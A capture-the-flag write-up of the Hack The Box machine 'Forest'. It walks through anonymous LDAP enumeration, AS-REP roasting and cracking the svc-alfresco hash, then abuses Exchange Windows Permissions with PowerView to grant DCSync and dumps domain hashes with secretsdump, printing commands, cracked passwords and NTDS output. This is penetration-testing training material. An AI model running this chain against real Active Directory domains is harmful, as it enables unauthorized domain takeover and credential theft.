---
title: Forest
date: 2026-08-21
description: Easy Windows AD machine with anonymous LDAP access — AS-REP roasting a pre-auth-disabled service account for a foothold, then abusing GenericAll over Exchange Windows Permissions to grant DCSync and dump domain credentials.
tags:
  - htb
  - Easy
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Thu Aug 20 07:57:17 2026 as: /usr/lib/nmap/nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49680,49681,49685,49697,49857 -A -oN scan_results.txt 10.129.95.210
Nmap scan report for forest.htb (10.129.95.210)
Host is up (0.68s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-08-19 12:08:00Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        Microsoft Windows RPC
49685/tcp open  msrpc        Microsoft Windows RPC
49697/tcp open  msrpc        Microsoft Windows RPC
49857/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 (99%), Microsoft Windows Server 2012 R2 (96%), Microsoft Windows Server 2012 (93%), Microsoft Windows 10 1511 (91%), Microsoft Windows Server 2012 or 2012 R2 (91%), Microsoft Windows Server 2022 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows 7 or Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows 10 1607 (90%), Microsoft Windows Server 2012 or Server 2012 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-19T12:09:28
|_  start_date: 2026-08-19T12:01:31
|_clock-skew: mean: -21h29m28s, deviation: 4h02m31s, median: -23h49m29s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-08-19T05:09:25-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   653.72 ms 10.10.16.1
2   302.51 ms forest.htb (10.129.95.210)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 20 07:59:37 2026 -- 1 IP address (1 host up) scanned in 139.64 seconds

```

> **Important**: The domain name is `htb.local` not `forest.htb`

SMB guest login is not accessible, and WinRM requires valid creds.

> ldap - Use ldapsearch for querying LDAP directories and extracting information.

LDAP is commonly used for user authentication, authorization, and storing organizational information. Microsoft's Active Directory is built on LDAP, and LDAP directories store information hierarchically in a tree structure.

> https://hackviser.com/tactics/pentesting/services/ldap

```sh
# Anonymous bind (no authentication)  
ldapsearch -x -H ldap://10.129.95.210 -b "dc=htb,dc=local"
```

---

Note:

```sh
# With credentials  
ldapsearch -x -H ldap://target.com -D "cn=admin,dc=example,dc=com" -w password -b "dc=example,dc=com"
```

---

```sh
# Search specific object class  
ldapsearch -x -H ldap://10.129.95.210 -b "dc=htb,dc=local" "(objectClass=person)"

# Get all attributes (preferable due to the service account we found didn't had any objectclass)
ldapsearch -x -H ldap://10.129.95.210 -b "dc=htb,dc=local" "*" > enumall.txt
```

```text
# extended LDIF
#
# LDAPv3
# base <DC=htb,DC=local> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# htb.local
dn: DC=htb,DC=local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=htb,DC=local
instanceType: 5
whenCreated: 20190918174549.0Z
whenChanged: 20260819120121.0Z
subRefs: DC=ForestDnsZones,DC=htb,DC=local
subRefs: DC=DomainDnsZones,DC=htb,DC=local
subRefs: CN=Configuration,DC=htb,DC=local
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAOqNrI1l5QUq5WV+CaJoIcQ==
uSNChanged: 929834
name: htb
objectGUID:: Gsfw30mpJkuMe1Lj4stuqw==
replUpToDateVector:: RxZtKkWpCEecA0AAAAAAJnFPhcDAAAAEuOp8cC6t0+uaoe83jqnLQfAAAAAAAAAwzeZEwMAAACevY
 D5RBP7RbrYAQrgjhuPHNAMAAAAAACxrz4XAwAAAA==
creationTime: 134316144814200176
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -9223372036854775808
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
nextRid: 1000
pwdProperties: 0
pwdHistoryLength: 24
objectSid:: AQQAAAAAAAUVAAAALB4ltxV1shXFsPNP
serverState: 1

...<SNIP>...


# Sebastien Caron, Exchange Administrators, Information Technology, Employees, 
 htb.local
dn: CN=Sebastien Caron,OU=Exchange Administrators,OU=Information Technology,OU
 =Employees,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Sebastien Caron
sn: Caron
givenName: Sebastien
distinguishedName: CN=Sebastien Caron,OU=Exchange Administrators,OU=Informatio
 n Technology,OU=Employees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920002959.0Z
whenChanged: 20190923220353.0Z
displayName: Sebastien Caron
uSNCreated: 26021
uSNChanged: 81993
name: Sebastien Caron
objectGUID:: FZgcKIpNfUKd9QkF33jQaw==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 132136649695862270
pwdLastSet: 132134129995447247
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPeQQAAA==
accountExpires: 9223372036854775807
logonCount: 8
sAMAccountName: sebastien
sAMAccountType: 805306368
userPrincipalName: sebastien@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20260819125718.0Z
dSCorePropagationData: 20260819125718.0Z
dSCorePropagationData: 20260819125718.0Z
dSCorePropagationData: 20260819125718.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132134965694676682

# Developers, Information Technology, Employees, htb.local
dn: OU=Developers,OU=Information Technology,OU=Employees,DC=htb,DC=local
objectClass: top
objectClass: organizationalUnit
ou: Developers
distinguishedName: OU=Developers,OU=Information Technology,OU=Employees,DC=htb
 ,DC=local
instanceType: 4
whenCreated: 20190920002211.0Z
whenChanged: 20190920002211.0Z
uSNCreated: 26007
uSNChanged: 26008
name: Developers
objectGUID:: GXvZmNWtmkmPo7rulxMGsA==
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo

...<SNIP>...
```

# User

"Huge data" — so grep extracts just the headings to find something valuable:

```sh
grep "#" enumall.txt
```

Usernames and roles surfaced — service accounts and employees.

> Alfresco services (svc-alfresco) refer to the core backend and integration services powering Alfresco Content Services (ACS), an enterprise content management (ECM) platform

## AS-REP Roasting

Now look for accounts with Kerberos pre-authentication disabled using **GetNPUsers** from **impackets** (No Pre-authentication Users):

```sh
$ impacket-GetNPUsers htb.local/svc-alfresco -no-pass -dc-ip 10.129.95.210
```

```text
$krb5asrep$23$svc-alfresco@HTB.LOCAL:fe3fef08c6ec885f7d71e9aacb3c1855$f6536054f2d121be57d83f991e9142b100be199a2897657ba07f9b09fe519dfc3a98287714b7b4cbb8fd313d4ee51f3acf5709959a920392d6e0eb3b46e2c79e82a07431825d0a42a3780804e0c13b384b1cd2856229dbe406d5d3406fcfcf39f04a41773bd7065774f02dba2cbaaed99b1c3cf18f0d60fffd731d98e189936e23071f260f643b4a3ecb7c09f49e8bfedbb2b040493d8be2e7355e34e695bc5eedac49cdfd7792449e757d9dee7f7571142be2a712823163c5daf221179a4d2dee905ad2ed25f1f73327ab01117a7342ea8d7cb538e4b4a0ab5a2c1c5b02edfdc33d8097dfc6
```

A **krb5asrep** (Kerberos authentication response hash), cracked with `john`:

```sh
$ john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt krb-hash
```

> `svc-alfresco : s3rvice`

Gained a shell using evil-winrm.

# Root

SharpHound errors out with "latest version 2.14.0 is incompatible":

```html
 <!-- due to outdated .net version on the target --> 
<startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
  </startup>
```

> Recommended: https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.exe

Upload SharpHound and download the collected zip:

```powershell
*Evil-WinRM* PS C:\> ./sharphound.exe
```

Upload the zip to BloodHound and select the shortest paths to high value targets in cypher.

## Attack path

The path to the domain controller: as a member of **Account Operators** and **Privileged IT Accounts**, the user can add, delete, and modify (**GenericAll**) accounts of the **Exchange Windows Permissions** group, and holds privilege over **Remote Management Users** through that same membership. The **Exchange Windows Permissions** group has **writeDACL** over the Domain.

> The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL
>
> With write access to the target object's DACL, you can grant yourself any permission you want on the object.

Steps:

1. Create a user in the domain (password must satisfy policy)

```powershell
*Evil-WinRM* PS C:\> net user john 'abc123!' /domain /add

The command completed successfully.
```

2. Add the new user to the Exchange Windows Permissions group

```powershell
*Evil-WinRM* PS C:\> net group "Exchange Windows Permissions" john /add

The command completed successfully.
```

3. Add the new user to the Remote Management Users local group

```powershell
*Evil-WinRM* PS C:\> net localgroup "Remote Management Users" john /add

The command completed successfully.
```

Successfully added a new user with all the permissions needed.

To abuse WriteDacl on a domain object, grant yourself DCSync permissions.

## PowerView

> link: https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

Upload PowerView to execute:

```powershell
*Evil-WinRM* PS C:\> . .\PowerView.ps1 # current session
```

-- alternative --

```powershell
*Evil-WinRM* PS C:\> ./PowerView.ps1 <powershell-commands> # isolated child process
```

4. Replicate the steps with the slight alterations BloodHound suggested to abuse the permission:

```powershell
*Evil-WinRM* PS C:\> $SecPassword = ConvertTo-SecureString 'abc123!' -AsPlainText -Force

# domain name is "htb" not the forest (eg: ACTIVE\Username)
*Evil-WinRM* PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('htb\john', $SecPassword)
```

Target the **Object**, not the **DomainObject** — use **Principal Identity** for the user instead of **TargetIdentity**, which targets the domain:

```powershell
*Evil-WinRM* PS C:\> Add-ObjectAcl -Credential $Cred -PrincipalIdentity john -Rights DCSync
```

With DCSync rights granted, dump the secrets with **secretsdump** from **impackets**:

```sh
# "htb" is the domain name not the forest (eg: ACTIVE\Username)
$ impacket-secretsdump 'htb/john:abc123!@10.129.95.210'
```

```text
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...<SNIP>...
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
john:10101:aad3b435b51404eeaad3b435b51404ee:44f077e27f6fef69e7bd834c7242b040:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:735edd21087dfd1fa8a2751392d67ce6:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
...<SNIP>...
[*] Cleaning up...

```

The **NT hash** logs in through **evil-winrm**.

Gained `root`
